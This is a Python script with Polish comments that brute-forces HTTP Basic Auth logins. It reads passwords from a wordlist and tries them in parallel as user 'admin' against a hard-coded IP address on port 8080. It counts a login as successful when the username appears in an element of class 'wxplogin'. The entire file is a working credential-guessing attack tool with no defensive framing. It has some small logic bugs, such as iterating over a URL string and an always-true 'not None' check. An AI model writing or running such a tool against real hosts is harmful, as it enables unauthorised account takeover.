#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
import sys
# import threading
from multiprocessing import Pool, freeze_support, cpu_count
import itertools
from timeout import *


class passbrk(object):
    """docstring for passbrk"""

    def __init__(self, linklist, passlist, username):
        super(passbrk, self).__init__()
        self.linklist = linklist
        self.user = username

        self.passlist = self.gen_pass_list_from_file(passlist)
        # self.linklist = self.gen_method_list_from_file(linklist)

    def gen_method_list_from_file(self, linkometoda):
        link_list = []
        with open(linkometoda, 'r') as f:
            for line in f.readlines():
                link = line.strip('\n')
                link_list.append(link)
        return link_list

    def gen_pass_list_from_file(self, passlist='dictionary.txt'):
        """ czyta liste hasel w formacie txt (oddzielone nowymi liniam)
        i wczytuje je do listy
         """
        pass_list = []
        with open(passlist, 'r') as f:
            for line in f.readlines():
                password = line.strip('\n')
                pass_list.append(password)
        return pass_list

    @timeout(1)
    def checkl(self, password1):
        """
        sprawdza, czy udalo sie zalogowac (naiwnie):
        czy w http strony wystepuje nazwa uzytkownika
        (np. "successfully logged in as admin")
        """
        try:
            if (self.user in str(BeautifulSoup(requests.get(self.linklist, auth=requests.auth.HTTPBasicAuth(self.user, password1)).text, "lxml").find_all(attrs={'class': 'wxplogin'})) + "\n"):
                print('Znalazłem hasło: ' + str(password1))
                return password1
            else:
                # print(password1)
                return False
            pass
        except Exception as e:
            print('Błąd: Nie udało się połączyć. ' + str(e))
        pass

    def part_POOL(self, plist):
        with Pool(self.n_pool) as pool:
            results = []
            try:
                result_pool = [pool.map_async(self.checkl, plist)]
                for result in result_pool:
                    try:
                        results.append(result.get())
                    except:
                        results.append(None)
            except:
                print('Błąd: Mapowanie się nie powiodło.')

        return results

    def sprawdzaj_listy_POOL(self):
        """
        uzywa pool, czyli modelu producent-konsument
        mapuje funkcje sprawdzajaca na liste hasel
        """
        for metoda in self.linklist:
            try:
                self.n_pool = (cpu_count() - 1) * 8
                pass
            except Exception as e:
                print("Uwaga: Nie wykryto liczby rdzeni - używam wartości domyślej.")
                self.n_pool = 4

            first = len(self.passlist) % 100
            rest = (len(self.passlist) - first) / 100
            plist = self.passlist[:first]
            # print(len(plist))

            for result in self.part_POOL(plist):
                for res in result:
                    if res is not False and not None:
                        return res

            for i in range(0, int(rest)):
                plist = self.passlist[first + i * 100:first + (i + 1) * 100]
                # print(len(plist))

                for result in self.part_POOL(plist):
                    for res in result:
                        if res is not False and not None:
                            return res


if __name__ == '__main__':

    lista_metod = 'http://59.177.49.12:8080'
    lista_hasel = 'dictionary.txt'
    user = 'admin'

    freeze_support()
    passwordbreaker = passbrk(linklist=lista_metod,
                              passlist=lista_hasel, username=user)
    print((passwordbreaker.sprawdzaj_listy_POOL()))
